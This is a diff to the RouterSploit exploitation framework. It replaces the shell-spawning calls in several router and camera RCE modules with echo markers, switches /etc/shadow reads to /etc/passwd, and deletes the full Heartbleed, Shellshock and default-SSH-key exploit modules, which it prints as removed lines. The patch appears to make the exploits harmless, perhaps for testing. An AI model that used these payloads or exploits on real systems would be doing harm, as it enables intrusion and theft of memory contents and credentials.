@@ -1,0 +1,1619 @@
+diff --git a/routersploit/interpreter.py b/routersploit/interpreter.py
+index 672fcd8..b3ccb6f 100644
+--- a/routersploit/interpreter.py
++++ b/routersploit/interpreter.py
+@@ -311,6 +311,28 @@ class RoutersploitInterpreter(BaseInterpreter):
+ 
+         return
+ 
++    def run_command(self, in_command):
++        """ Routersploit main entry point. Starting interpreter loop. """
++
++        #print_info(self.banner)
++        printer_queue.join()
++        try:
++            command, args, _ = self.parse_line(in_command)
++            if not command:
++                pass
++            command_handler = self.get_command_handler(command)
++            command_handler(args)
++        except RoutersploitException as err:
++            print_error(err)
++        except EOFError:
++            print_info()
++            print_status("routersploit stopped")
++            return
++        except KeyboardInterrupt:
++            print_info()
++        finally:
++            printer_queue.join()
++
+     @property
+     def module_metadata(self):
+         return getattr(self.current_module, "_{}__info__".format(self.current_module.__class__.__name__))
+diff --git a/routersploit/modules/exploits/cameras/multi/P2P_wificam_rce.py b/routersploit/modules/exploits/cameras/multi/P2P_wificam_rce.py
+index bfb8b16..b41fe2a 100644
+--- a/routersploit/modules/exploits/cameras/multi/P2P_wificam_rce.py
++++ b/routersploit/modules/exploits/cameras/multi/P2P_wificam_rce.py
+@@ -1281,7 +1281,8 @@ class Exploit(HTTPClient):
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+             print_status("It is blind command injection - response is not available. Use reverse_tcp <reverse ip> <port>")
+-            shell(self, architecture="mipsbe", method="wget", location="/tmp")
++            self.execute("echo b33f1")
++            #shell(self, architecture="mipsbe", method="wget", location="/tmp")
+         else:
+             print_error("Exploit failed. Device seems to be not vulnerable.")
+ 
+diff --git a/routersploit/modules/exploits/cameras/mvpower/dvr_jaws_rce.py b/routersploit/modules/exploits/cameras/mvpower/dvr_jaws_rce.py
+index f37f438..a25306d 100644
+--- a/routersploit/modules/exploits/cameras/mvpower/dvr_jaws_rce.py
++++ b/routersploit/modules/exploits/cameras/mvpower/dvr_jaws_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+     def run(self):
+         if self.check():
+             print_success("Target seems to be vulnerable")
+-            shell(self, architecture="armle", method="echo", location="/tmp")
++            self.execute("echo b33f2")
++            #shell(self, architecture="armle", method="echo", location="/tmp")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/generic/__init__.py b/routersploit/modules/exploits/generic/__init__.py
+deleted file mode 100644
+index e69de29..0000000
+diff --git a/routersploit/modules/exploits/generic/heartbleed.py b/routersploit/modules/exploits/generic/heartbleed.py
+deleted file mode 100644
+index 6a72e57..0000000
+--- a/routersploit/modules/exploits/generic/heartbleed.py
++++ /dev/null
+@@ -1,353 +0,0 @@
+-import re
+-import binascii
+-from time import time
+-from struct import pack, unpack
+-from cryptography import x509
+-from cryptography.hazmat.backends import default_backend
+-from routersploit.core.exploit import *
+-from routersploit.core.exploit.exploit import Protocol
+-from routersploit.core.tcp.tcp_client import TCPClient
+-
+-
+-class Exploit(TCPClient):
+-    __info__ = {
+-        "name": "OpenSSL Heartbleed",
+-        "description": "Exploits OpenSSL Heartbleed vulnerability. Vulnerability exists in the handling of heartbeat requests,"
+-                       " where fake length can be used to leak memory data in the response. This module is heavily based on "
+-                       " Metasploit module.",
+-        "authors": (
+-            "Neel Mehta",  # vulnerability discovery
+-            "Riku",  # vulnerability discovery
+-            "Antti",  # vulnerability discovery
+-            "Matti",  # vulnerability discovery
+-            "Jared Stafford <jspenguin[at]jspenguin.org>",  # Original Proof of Concept. This module is based on it.
+-            "FiloSottile",  # PoC site and tool
+-            "Christian Mehlmauer",  # metasploit module
+-            "wvu",  # metasploit module
+-            "juan vazquez",  # metasploit module
+-            "Sebastiano Di Paola",  # metasploit module
+-            "Tom Sellers",  # metasploit module
+-            "jjarmoc",  # metasploit module; keydump, refactoring..
+-            "Ben Buchanan",  # metasploit module
+-            "herself",  # metasploit module
+-            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
+-        ),
+-        "references": (
+-            "http://www.cvedetails.com/cve/2014-0160",
+-            "http://heartbleed.com/",
+-            "https://www.us-cert.gov/ncas/alerts/TA14-098A",
+-            "https://gist.github.com/takeshixx/10107280",
+-            "https://github.com/FiloSottile/Heartbleed",
+-            "http://filippo.io/Heartbleed/",
+-            "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb",
+-        ),
+-        "devices": (
+-            "Multi",
+-        ),
+-    }
+-
+-    target_protocol = Protocol.HTTP
+-
+-    target = OptIP("", "Target IPv4 or IPv6 address")
+-    port = OptPort(443, "Target HTTP port")
+-
+-    tls_version = OptString("1.0", "TLS/SSL version to use: SSLv3, 1.0, 1.1, 1.2")
+-    heartbeat_length = OptInteger(65535, "Heartbeat length")
+-
+-    CIPHER_SUITS = (
+-        0xc014,  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+-        0xc00a,  # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+-        0xc022,  # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
+-        0xc021,  # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
+-        0x0039,  # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+-        0x0038,  # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
+-        0x0088,  # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
+-        0x0087,  # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
+-        0x0087,  # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+-        0xc00f,  # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+-        0x0035,  # TLS_RSA_WITH_AES_256_CBC_SHA
+-        0x0084,  # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
+-        0xc012,  # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+-        0xc008,  # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+-        0xc01c,  # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
+-        0xc01b,  # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
+-        0x0016,  # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+-        0x0013,  # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
+-        0xc00d,  # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+-        0xc003,  # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+-        0x000a,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
+-        0xc013,  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+-        0xc009,  # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+-        0xc01f,  # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
+-        0xc01e,  # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
+-        0x0033,  # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+-        0x0032,  # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
+-        0x009a,  # TLS_DHE_RSA_WITH_SEED_CBC_SHA
+-        0x0099,  # TLS_DHE_DSS_WITH_SEED_CBC_SHA
+-        0x0045,  # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
+-        0x0044,  # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
+-        0xc00e,  # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+-        0xc004,  # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+-        0x002f,  # TLS_RSA_WITH_AES_128_CBC_SHA
+-        0x0096,  # TLS_RSA_WITH_SEED_CBC_SHA
+-        0x0041,  # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
+-        0xc011,  # TLS_ECDHE_RSA_WITH_RC4_128_SHA
+-        0xc007,  # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+-        0xc00c,  # TLS_ECDH_RSA_WITH_RC4_128_SHA
+-        0xc002,  # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+-        0x0005,  # TLS_RSA_WITH_RC4_128_SHA
+-        0x0004,  # TLS_RSA_WITH_RC4_128_MD5
+-        0x0015,  # TLS_DHE_RSA_WITH_DES_CBC_SHA
+-        0x0012,  # TLS_DHE_DSS_WITH_DES_CBC_SHA
+-        0x0009,  # TLS_RSA_WITH_DES_CBC_SHA
+-        0x0014,  # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+-        0x0011,  # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
+-        0x0008,  # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
+-        0x0006,  # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+-        0x0003,  # TLS_RSA_EXPORT_WITH_RC4_40_MD5
+-        0x00ff   # Unknown
+-    )
+-
+-    SSL_RECORD_HEADER_SIZE = 0x05
+-    HANDSHAKE_RECORD_TYPE = 0x16
+-    HEARTBEAT_RECORD_TYPE = 0x18
+-    ALERT_RECORD_TYPE = 0x15
+-    HANDSHAKE_SERVER_HELLO_TYPE = 0x02
+-    HANDSHAKE_CERTIFICATE_TYPE = 0x0b
+-    HANDSHAKE_KEY_EXCHANGE_TYPE = 0x0c
+-    HANDSHAKE_SERVER_HELLO_DONE_TYPE = 0x0e
+-
+-    TLS_VERSION = {
+-        "SSLv3": 0x0300,
+-        "1.0": 0x0301,
+-        "1.1": 0x0302,
+-        "1.2": 0x0303
+-    }
+-
+-    def __init__(self):
+-        self.tcp_client = None
+-        self.leak = None
+-
+-        self.printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
+-        self.white_chars = " \t\n\r\x0b\x0c"
+-
+-    def run(self):
+-        self.leak = self.bleed()
+-        if self.leak:
+-            data = ""
+-            for l in self.leak:
+-                char = chr(l)
+-                if char in self.white_chars:
+-                    data += " "
+-                elif char not in self.printable:
+-                    data += "."
+-                else:
+-                    data += char
+-
+-            clean_data = ""
+-            tmp_b = 0
+-            for item in re.finditer(r"(\.){400,}", data):
+-                a, b = item.span()
+-                clean_data += data[tmp_b:a]
+-                tmp_b = b
+-                repeated = b - a - 64
+-                clean_data += "................................ repeated {} times ................................".format(repeated)
+-
+-            clean_data += data[b:]
+-            print_info(clean_data)
+-        else:
+-            print_error("Exploit failed - Target does not seem to be vulnerable")
+-
+-    @mute
+-    def check(self):
+-        if self.bleed():
+-            return True
+-
+-        return False
+-
+-    def bleed(self):
+-        if not self.establish_connect():
+-            print_error("Exploit failed - could not establish connection")
+-            return False
+-
+-        print_status("Sending Heartbeat...")
+-        heartbeat_req = self.heartbeat_request(self.heartbeat_length)
+-        self.tcp_client.send(heartbeat_req)
+-        hdr = self.tcp_client.recv_all(self.SSL_RECORD_HEADER_SIZE)
+-        if not hdr:
+-            print_error("No Heartbeat response...")
+-            return False
+-
+-        record_type, version, length = unpack(">BHH", hdr)
+-
+-        if record_type != self.HEARTBEAT_RECORD_TYPE or version != self.TLS_VERSION[self.tls_version]:
+-            print_error("Unexpected Hearbeat response header")
+-            self.tcp_client.close()
+-
+-        heartbeat_data = self.tcp_client.recv_all(self.heartbeat_length)
+-        if heartbeat_data:
+-            print_success("Heartbeat response, {} bytes".format(len(heartbeat_data)))
+-        else:
+-            print_error("No heartbeat response")
+-
+-        self.tcp_client.close()
+-
+-        return heartbeat_data
+-
+-    def establish_connect(self):
+-        self.tcp_client = self.tcp_create()
+-        self.tcp_client.connect()
+-
+-        print_status("Sending Client Hello...")
+-        data = self.client_hello()
+-        self.tcp_client.send(data)
+-
+-        server_response = self.get_server_hello()
+-        if not server_response:
+-            print_error("Server Hello not found")
+-
+-        return server_response
+-
+-    def get_server_hello(self):
+-        server_done = False
+-        ssl_record_counter = 0
+-        remaining_data = self.get_ssl_record()
+-
+-        while remaining_data and len(remaining_data) > 0:
+-            ssl_record_counter += 1
+-            ssl_type, ssl_version, ssl_len = unpack(">BHH", remaining_data[:5])
+-            print_status("SSL record {}".format(ssl_record_counter))
+-            print_status("\tType:    {}".format(ssl_type))
+-            print_status("\tVersion: 0x{:x}".format(ssl_version))
+-            print_status("\tLength:  {}".format(ssl_len))
+-
+-            if ssl_type != self.HANDSHAKE_RECORD_TYPE:
+-                print_status("\tWrong Record Type")
+-            else:
+-                ssl_data = remaining_data[5: 5 + ssl_len]
+-                handshakes = self.parse_handshakes(ssl_data)
+-
+-                # Stop once we receive SERVER_HELLO_DONE
+-                if handshakes and handshakes[-1]["type"] == self.HANDSHAKE_SERVER_HELLO_DONE_TYPE:
+-                    server_done = True
+-                    break
+-
+-            remaining_data = self.get_ssl_record()
+-
+-        return server_done
+-
+-    def parse_handshakes(self, data):
+-        remaining_data = data
+-        handshakes = []
+-        handshake_count = 0
+-
+-        while remaining_data and len(remaining_data) > 0:
+-            hs_type, hs_len_pad, hs_len = unpack(">BBH", remaining_data[:4])
+-            hs_data = remaining_data[4: 4 + hs_len]
+-            handshake_count += 1
+-            print_status("\tHandshake {}".format(handshake_count))
+-            print_status("\t\tLength: {}".format(hs_len))
+-
+-            handshake_parsed = None
+-            if hs_type == self.HANDSHAKE_SERVER_HELLO_TYPE:
+-                print_status("\t\tType: Server Hello ({})".format(hs_type))
+-                handshake_parsed = self.parse_server_hello(hs_data)
+-            elif hs_type == self.HANDSHAKE_CERTIFICATE_TYPE:
+-                print_status("\t\tType: Certificate Data ({})".format(hs_type))
+-                handshake_parsed = self.parse_certificate_data(hs_data)
+-            elif hs_type == self.HANDSHAKE_KEY_EXCHANGE_TYPE:
+-                print_status("\t\tType: Server Key Exchange ({})".format(hs_type))
+-            elif hs_type == self.HANDSHAKE_SERVER_HELLO_DONE_TYPE:
+-                print_status("\t\tType: Server Hello Done ({})".format(hs_type))
+-            else:
+-                print_status("\t\tType: Handshake type {} not implement".format(hs_type))
+-
+-            handshakes.append({
+-                "type": hs_type,
+-                "len": hs_len,
+-                "data": handshake_parsed
+-            })
+-            remaining_data = remaining_data[4 + hs_len:]
+-
+-        return handshakes
+-
+-    def parse_server_hello(self, data):
+-        version = unpack(">H", data[:2])[0]
+-        print_status("\t\tServer Hello Version: 0x{:x}".format(version))
+-        random = unpack(">" + "B" * 32, data[2:34])
+-        random_hex = str(binascii.hexlify(bytes(random)), "utf-8")
+-        print_status("\t\tServer Hello random data: {}".format(random_hex))
+-        session_id_length = unpack(">B", data[34:35])[0]
+-        print_status("\t\tServer Hello Session ID length: {}".format(session_id_length))
+-        session_id = unpack(">" + "B" * session_id_length, data[35: 35 + session_id_length])
+-        session_id_hex = str(binascii.hexlify(bytes(session_id)), "utf-8")
+-        print_status("\t\tServer Hello session id: {}".format(session_id_hex))
+-
+-    def parse_certificate_data(self, data):
+-        cert_len_padding, cert_len = unpack(">BH", data[:3])
+-        print_status("\t\tCertificates length: {}".format(cert_len))
+-        print_status("\t\tData length: {}".format(len(data)))
+-
+-        # contains multiple certs
+-        already_read = 3
+-        cert_counter = 0
+-        while already_read < cert_len:
+-            cert_counter += 1
+-            # get single certificate length
+-            single_cert_len_padding, single_cert_len = unpack(">BH", data[already_read: already_read + 3])
+-            print_status("\t\tCertificate {}".format(cert_counter))
+-            print_status("\t\t\tCertificate {}: Length: {}".format(cert_counter, single_cert_len))
+-            certificate_data = data[(already_read + 3): (already_read + 3 + single_cert_len)]
+-            cert = x509.load_der_x509_certificate(certificate_data, default_backend())
+-            print_status("\t\t\tCertificate {}: {}".format(cert_counter, cert))
+-
+-            already_read = already_read + single_cert_len + 3
+-
+-    def get_ssl_record(self):
+-        hdr = self.tcp_client.recv_all(self.SSL_RECORD_HEADER_SIZE)
+-
+-        if hdr:
+-            length = unpack(">BHH", hdr)[2]
+-            data = self.tcp_client.recv_all(length)
+-            hdr += data
+-
+-            return hdr
+-
+-        return None
+-
+-    def client_hello(self):
+-        # user current time for TLS time
+-        time_epoch = int(time())
+-        cipher_suits_len = len(self.CIPHER_SUITS)
+-
+-        hello_data = pack(">H", self.TLS_VERSION[self.tls_version])  # Version TLS
+-        hello_data += pack(">L", time_epoch)                        # Time in epoch format
+-        hello_data += bytes(utils.random_text(28), "utf-8")         # Random
+-        hello_data += b"\x00"                                       # Session ID length
+-        hello_data += pack(">H", cipher_suits_len * 2)              # Cipher Suits Length (102)
+-        hello_data += pack(">" + "H" * cipher_suits_len, *self.CIPHER_SUITS)  # Cipher Suites
+-        hello_data += b"\x01"                                       # Compression methods length (1)
+-        hello_data += b"\x00"                                       # Compression methods: null
+-
+-        hello_data_extensions = b"\x00\x0f"                         # Extension type (Heartbeat)
+-        hello_data_extensions += b"\x00\x01"                        # Extension length
+-        hello_data_extensions += b"\x01"                            # Extension data
+-
+-        hello_data += pack(">H", len(hello_data_extensions))
+-        hello_data += hello_data_extensions
+-
+-        data = b"\x01\x00"                                          # Handshake Type: Client Hello (1)
+-        data += pack(">H", len(hello_data))                         # Length
+-        data += hello_data
+-
+-        return self.ssl_record(self.HANDSHAKE_RECORD_TYPE, data)
+-
+-    def heartbeat_request(self, length):
+-        payload = b"\x01"           # Heartbeat Message Type: Request (1)
+-        payload += pack(">H", length)
+-        return self.ssl_record(self.HEARTBEAT_RECORD_TYPE, payload)
+-
+-    def ssl_record(self, record_type, data):
+-        record = pack(">BHH", record_type, self.TLS_VERSION[self.tls_version], len(data))
+-        record += data
+-        return record
+diff --git a/routersploit/modules/exploits/generic/shellshock.py b/routersploit/modules/exploits/generic/shellshock.py
+deleted file mode 100644
+index f3032da..0000000
+--- a/routersploit/modules/exploits/generic/shellshock.py
++++ /dev/null
+@@ -1,96 +0,0 @@
+-import re
+-import string
+-from routersploit.core.exploit import *
+-from routersploit.core.http.http_client import HTTPClient
+-
+-
+-class Exploit(HTTPClient):
+-    __info__ = {
+-        "name": "Shellshock",
+-        "description": "Exploits shellshock vulnerability that allows executing commands on operating system level.",
+-        "authors": (
+-            "Marcin Bury <marcin@threat9.com>",  # routersploit module
+-        ),
+-        "references": (
+-            "https://access.redhat.com/articles/1200223",
+-            "http://seclists.org/oss-sec/2014/q3/649",
+-            "http://blog.trendmicro.com/trendlabs-security-intelligence/shell-attack-on-your-server-bash-bug-cve-2014-7169-and-cve-2014-6271/",
+-        ),
+-        "devices": (
+-            "Multi",
+-        ),
+-    }
+-    target = OptIP("", "Target IPv4 or IPv6 address")
+-    port = OptPort(80, "Target HTTP port")
+-
+-    path = OptString("/", "Url path")
+-    method = OptString("GET", "HTTP method")
+-    header = OptString("User-Agent", "HTTP header injection point")
+-
+-    def __init__(self):
+-        self.payloads = [
+-            '() { :;};echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"',  # cve-2014-6271
+-            '() { _; } >_[$($())] { echo -e "\\r\\n{{marker}}$(/bin/bash -c "{{cmd}}"){{marker}}"; }',  # cve-2014-6278
+-        ]
+-        self.valid = None
+-
+-    def run(self):
+-        if self.check():
+-            print_success("Target is vulnerable")
+-            print_status("Invoking command loop...")
+-            shell(self)
+-        else:
+-            print_error("Target is not vulnerable")
+-
+-    def execute(self, cmd):
+-        marker = utils.random_text(32)
+-        injection = self.valid.replace("{{marker}}", marker).replace("{{cmd}}", cmd)
+-
+-        headers = {
+-            self.header: injection,
+-        }
+-
+-        response = self.http_request(
+-            method=self.method,
+-            path=self.path,
+-            headers=headers
+-        )
+-
+-        if response is None:
+-            return
+-
+-        regexp = "{}(.+?){}".format(marker, marker)
+-        res = re.findall(regexp, response.text, re.DOTALL)
+-
+-        if len(res):
+-            return res[0]
+-        else:
+-            return ""
+-
+-    @mute
+-    def check(self):
+-        number = int(utils.random_text(6, alph=string.digits))
+-        solution = number - 1
+-        cmd = "echo $(({}-1))".format(number)
+-
+-        marker = utils.random_text(32)
+-        for payload in self.payloads:
+-            injection = payload.replace("{{marker}}", marker).replace("{{cmd}}", cmd)
+-
+-            headers = {
+-                self.header: injection,
+-            }
+-
+-            response = self.http_request(
+-                method=self.method,
+-                path=self.path,
+-                headers=headers
+-            )
+-            if response is None:
+-                continue
+-
+-            if str(solution) in response.text:
+-                self.valid = payload
+-                return True  # target is vulnerable
+-
+-        return False  # target not vulnerable
+diff --git a/routersploit/modules/exploits/generic/ssh_auth_keys.py b/routersploit/modules/exploits/generic/ssh_auth_keys.py
+deleted file mode 100644
+index 21b2207..0000000
+--- a/routersploit/modules/exploits/generic/ssh_auth_keys.py
++++ /dev/null
+@@ -1,89 +0,0 @@
+-import os
+-import json
+-from routersploit.core.exploit import *
+-from routersploit.core.ssh.ssh_client import SSHClient
+-
+-
+-class Exploit(SSHClient):
+-    __info__ = {
+-        "name": "Multi SSH Authorized Keys",
+-        "description": "Module exploits private key exposure vulnerability. If the target is "
+-                       "vulnerable it is possible to authentiate to the device.",
+-        "authors": (
+-            "xistence <xistence[at]0x90.nl>",  # Quantum DXi V1000, Array Networks, Loadbalancer.org Enterprise VA 7.5.2 vulnerability discovery
+-            "Cristiano Maruti (@cmaruti)",  # Baracuda Load Balancer vulnerabiltiy discovery
+-            "Jasper Greve",  # Ceragon FibeAir IP-10 vulnerability doscovery
+-            "HD Moore",  # Ceragon FibeAir IP-10 vulnerability discovery
+-            "Matta Consulting",  # F5 BigIP
+-            "egypt",  # ExaGrid
+-            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
+-        ),
+-        "references": (
+-            "https://github.com/rapid7/ssh-badkeys",
+-            "http://packetstormsecurity.com/files/125761/Array-Networks-vxAG-xAPV-Privilege-Escalation.html",
+-            "http://seclists.org/fulldisclosure/2015/Jan/76",
+-            "https://github.com/cmaruti/reports/raw/master/barracuda_load_balancer_vm.pdf",
+-            "https://gist.github.com/todb-r7/5d86ecc8118f9eeecc15",
+-            "https://www.trustmatta.com/advisories/MATTA-2012-002.txt",
+-            "https://community.rapid7.com/community/metasploit/blog/2012/06/11/scanning-for-vulnerable-f5-bigips-with-metasploit",
+-            "http://packetstormsecurity.com/files/125754/Loadbalancer.org-Enterprise-VA-7.5.2-Static-SSH-Key.html",
+-            "https://www.kb.cert.org/vuls/id/662676",
+-            "http://packetstormsecurity.com/files/125755/quantum-root.txt",
+-            "https://github.com/mitchellh/vagrant/tree/master/keys",
+-            "https://community.rapid7.com/community/infosec/blog/2016/04/07/r7-2016-04-exagrid-backdoor-ssh-keys-and-hardcoded-credentials",
+-        ),
+-        "devices": (
+-            "ExaGrid firmware < 4.8 P26",
+-            "Quantum DXi V1000",
+-            "Array Networks vxAG 9.2.0.34 and vAPV 8.3.2.17 appliances",
+-            "Barracuda Load Balancer",
+-            "Ceragon FibeAir IP-10",
+-            "F5 BigIP",
+-            "Loadbalancer.org Enterprise VA 7.5.2",
+-            "Digital Alert Systems DASDEC and Monroe Electronics One-Net E189 Emergency Alert System",
+-            "Vagrant",
+-        ),
+-    }
+-    target = OptIP("", "Target IPv4 or IPv6 address")
+-    port = OptPort(22, "Target SSH port")
+-
+-    def __init__(self):
+-        self.valid = None
+-        self.private_keys = []
+-
+-        ssh_keys_path = os.path.join(utils.RESOURCES_DIR, "ssh_keys")
+-        ssh_keys = [".".join(filename.split(".")[:-1]) for filename in os.listdir(ssh_keys_path) if filename.endswith(".json")]
+-
+-        for ssh_key in ssh_keys:
+-            path = "{}/{}.json".format(ssh_keys_path, ssh_key)
+-            with open(path, "r") as f:
+-                data = json.load(f)
+-
+-            path = "{}/{}.key".format(ssh_keys_path, ssh_key)
+-            with open(path, "r") as f:
+-                data["priv_key"] = f.read()
+-
+-            self.private_keys.append(data)
+-
+-    def run(self):
+-        if self.check():
+-            print_success("Target seems to be vulnerable")
+-            ssh_client = self.ssh_create()
+-            if ssh_client.login_pkey(self.valid["username"], self.valid["priv_key"]):
+-                ssh_client.interactive()
+-                ssh_client.close()
+-            else:
+-                print_error("Exploit failed - target seems to be not vulnerable")
+-        else:
+-            print_error("Exploit failed - target seems to be not vulnerable")
+-
+-    @mute
+-    def check(self):
+-        for key in self.private_keys:
+-            ssh_client = self.ssh_create()
+-            if ssh_client.login_pkey(key["username"], key["priv_key"]):
+-                ssh_client.close()
+-                self.valid = key
+-                return True  # target is vulnerable
+-
+-        return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/misc/asus/b1m_projector_rce.py b/routersploit/modules/exploits/misc/asus/b1m_projector_rce.py
+index 07c4811..f72d82c 100644
+--- a/routersploit/modules/exploits/misc/asus/b1m_projector_rce.py
++++ b/routersploit/modules/exploits/misc/asus/b1m_projector_rce.py
+@@ -26,7 +26,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f3")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Target is not vulnerable")
+ 
+@@ -45,10 +46,10 @@ class Exploit(HTTPClient):
+ 
+     @mute
+     def check(self):
+-        cmd = "cat /etc/shadow"
++        cmd = "cat /etc/passwd"
+         response_text = self.execute(cmd)
+ 
+-        if utils.detect_file_content(response_text, "/etc/shadow"):
++        if utils.detect_file_content(response_text, "/etc/passwd"):
+             return True  # target is vulnerable
+ 
+         return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/misc/miele/pg8528_path_traversal.py b/routersploit/modules/exploits/misc/miele/pg8528_path_traversal.py
+index 2563b47..450a6b9 100644
+--- a/routersploit/modules/exploits/misc/miele/pg8528_path_traversal.py
++++ b/routersploit/modules/exploits/misc/miele/pg8528_path_traversal.py
+@@ -23,7 +23,7 @@ class Exploit(HTTPClient):
+     target = OptIP("", "Target IPv4 or IPv6 address")
+     port = OptPort(80, "Target HTTP port")
+ 
+-    filename = OptString("/etc/shadow", "File to read from filesystem")
++    filename = OptString("/etc/passwd", "File to read from filesystem")
+ 
+     def run(self):
+         if self.check():
+@@ -49,10 +49,10 @@ class Exploit(HTTPClient):
+     def check(self):
+         response = self.http_request(
+             method="GET",
+-            path="/../../../../../../../../../../../../etc/shadow"
++            path="/../../../../../../../../../../../../etc/passwd"
+         )
+ 
+-        if response and utils.detect_file_content(response.text, "/etc/shadow"):
++        if response and utils.detect_file_content(response.text, "/etc/passwd"):
+             return True  # target vulnerable
+ 
+         return False  # target is not vulnerable
+diff --git a/routersploit/modules/exploits/misc/wepresent/wipg1000_rce.py b/routersploit/modules/exploits/misc/wepresent/wipg1000_rce.py
+index d557711..10d3744 100644
+--- a/routersploit/modules/exploits/misc/wepresent/wipg1000_rce.py
++++ b/routersploit/modules/exploits/misc/wepresent/wipg1000_rce.py
+@@ -26,7 +26,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target seems to be vulnerable")
+             print_status("This is blind command injection, response is not available")
+-            shell(self, architecture="mipsbe", binary="netcat", shell="/bin/sh")
++            self.execute("echo b33f4")
++            #shell(self, architecture="mipsbe", binary="netcat", shell="/bin/sh")
+         else:
+             print_error("Exploit failed - exploit seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/3com/officeconnect_rce.py b/routersploit/modules/exploits/routers/3com/officeconnect_rce.py
+index 91f5424..deb5a37 100644
+--- a/routersploit/modules/exploits/routers/3com/officeconnect_rce.py
++++ b/routersploit/modules/exploits/routers/3com/officeconnect_rce.py
+@@ -40,7 +40,8 @@ class Exploit(HTTPClient):
+                 print_success("Target appears to be vulnerable")
+                 print_status("Invoking command loop...")
+                 print_status("It is blind command injection - response is not available")
+-                shell(self, architecture="mipsbe")
++                self.execute("echo b33f5")
++                #shell(self, architecture="mipsbe")
+             else:
+                 print_error("Exploit failed - target does not seem to be vulnerable")
+         else:
+diff --git a/routersploit/modules/exploits/routers/asmax/ar_804_gu_rce.py b/routersploit/modules/exploits/routers/asmax/ar_804_gu_rce.py
+index d3a66d2..736bdd3 100644
+--- a/routersploit/modules/exploits/routers/asmax/ar_804_gu_rce.py
++++ b/routersploit/modules/exploits/routers/asmax/ar_804_gu_rce.py
+@@ -29,7 +29,8 @@ class Exploit(HTTPClient):
+         if self.check():
+             print_success("Target is vulnerable")
+             print_status("Invoking command loop...")
+-            shell(self, architecture="mipsbe")
++            self.execute("echo b33f6")
++            #shell(self, architecture="mipsbe")
+         else:
+             print_error("Exploit failed - target seems to be not vulnerable")
+ 
+diff --git a/routersploit/modules/exploits/routers/asus/asuswrt_lan_rce.py b/routersploit/modules/exploits/routers/asus/asuswrt_lan_rce.py
+index 3c69436..90adc17 100644
+--- a/routersploit/modules/exploits/routers/asus/asuswrt_lan_rce.py
++++ b/routersploit/modules/exploits/routers/asus/asuswrt_lan_rce.py
+@@ -47,7 +47,8 @@ class Exploit(HTTPClient, UDPClient):
+             print_error("Failed to set ateCommand_flag variable")
+             return
+ 
+-        shell(self, architecture="armle", method="wget", location="/tmp")
++        self.execute("echo b33f7")
++        #shell(self, architecture="armle", method="wget", location="/tmp")
+ 
+     def execute(self, cmd):
+         ibox_comm_pkt_hdr_ex = (
+diff --git a/routersploit/modules/exploits/routers/asus/infosvr_backdoor_rce.py b/routersploit/modules/exploits/routers/asus/infosvr_backdoor_rce.py
+index 584a38d..4bed100 100644
+--- a/routersploit/modules/exploits/routers/asus/infosvr_backdoor_rce.py
++++ b/routersploit/modules/exploits/routers/asus/infosvr_backdoor_rce.py
+@@ -40,7 +40,8 @@ class Exploit(UDPClient):
+             print_status("Invoking command loop...")
+             print_status("Please note that only first 256 characters of the "
+                          "output will be displayed or use reverse_tcp")
+-            shell(self, architecture="armle", method="wget", location="/tmp")
++            self.execute("echo b33f8")
++            #shell(self, architecture="armle", method="wget", location="/tmp")
+         else:
+             print_error("Target is not vulnerable")
+ 
